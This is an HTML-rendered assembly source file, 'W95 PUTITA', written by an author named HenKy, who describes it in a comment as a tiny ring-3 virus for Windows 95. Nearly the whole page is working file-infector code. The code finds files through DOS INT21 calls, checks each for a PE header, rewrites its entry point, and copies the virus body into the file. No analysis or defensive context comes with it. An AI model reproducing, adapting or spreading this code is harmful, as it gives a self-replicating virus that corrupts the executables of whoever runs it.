<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>putita.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;----------------------------  W95 PUTITA BY HenKy -----------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-AUTHOR:        HenKy</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-MAIL:          HenKy_@latinmail.com</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;-ORIGIN:        SPAIN</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
     

 </span><span class="sc1">; BAH.... ONLY 183 BYTES.... SMALL RING 3 VIRUS</span><span class="sc0">

</span><span class="sc2">.386P</span><span class="sc0">
</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">FLAT</span><span class="sc0">
</span><span class="sc5">LOCALS</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">MIX_SIZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">FILE_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MEGAMIX</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">.DATA</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc13">'0                         
</span><span class="sc0">
</span><span class="sc9">.CODE</span><span class="sc0">

</span><span class="sc5">MEGAMIX</span><span class="sc4">:</span><span class="sc0">
                  

        </span><span class="sc5">VINT21</span><span class="sc4">:</span><span class="sc0">             
        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0BFF712B9h</span><span class="sc0">   </span><span class="sc1">; MOV ECX,0C3B912F7H  ;-) Z0MBiE</span><span class="sc0">
</span><span class="sc5">RETOX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">   </span><span class="sc1">; EDI: DELTA              </span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">0C1000000H</span><span class="sc0">  </span><span class="sc1">; ESI: BUFFER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">    </span><span class="sc1">; NOW: EBP=EDI=DELTA=INT21H</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc0">                     
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                      

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                        
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                         
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                    
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.DTA</span><span class="sc4">]</span><span class="sc0">             
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                  
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                    
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">                    
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc5">IMASK</span><span class="sc4">-</span><span class="sc5">MEGAMIX</span><span class="sc4">]</span><span class="sc0">  
</span><span class="sc5">FF_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                       
        </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">OK</span><span class="sc0">                     
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                  
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">         
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                       

        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">                   
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PHECT</span><span class="sc0">                  
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                  
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                  

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                     
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FF_</span><span class="sc0">
</span><span class="sc5">OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                        
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                   
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                       

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                         
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">00401000H</span><span class="sc0">
        </span><span class="sc5">OLD_EIP</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
 </span><span class="sc5">WARNING</span><span class="sc4">:</span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">                        
                        
</span><span class="sc5">PHECT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                       
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> 
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                 
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                   
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">R_W</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">             
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">            
       
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"P"</span><span class="sc0">        
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0">                
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">   
        </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0">  
     
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">28H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">34H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">OLD_EIP</span><span class="sc4">-</span><span class="sc5">MEGAMIX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        
</span><span class="sc5">PORRO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc12">'B'</span><span class="sc0"> </span><span class="sc1">; hehehehe</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">PORRO</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> 
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">             
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">  
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                                    
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                        
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                        
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                     
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSD</span><span class="sc0">                                  
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                         
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                                       
</span><span class="sc5">W</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                    
</span><span class="sc5">R_W</span><span class="sc4">:</span><span class="sc0">
                 
        </span><span class="sc6">PUSHAD</span><span class="sc0">                         
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">                   
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">                     
        </span><span class="sc6">CDQ</span><span class="sc0">                            
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                       
        </span><span class="sc6">POPAD</span><span class="sc0">                           
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">                                                    
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">IMASK</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"*.ZZZ"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ALIGN</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FILE_END</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">SF</span><span class="sc0">              </span><span class="sc9">STRUC</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SF</span><span class="sc0">              </span><span class="sc9">ENDS</span><span class="sc0">


        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">MEGAMIX</span><span class="sc0">
</span></div></body>
</html>
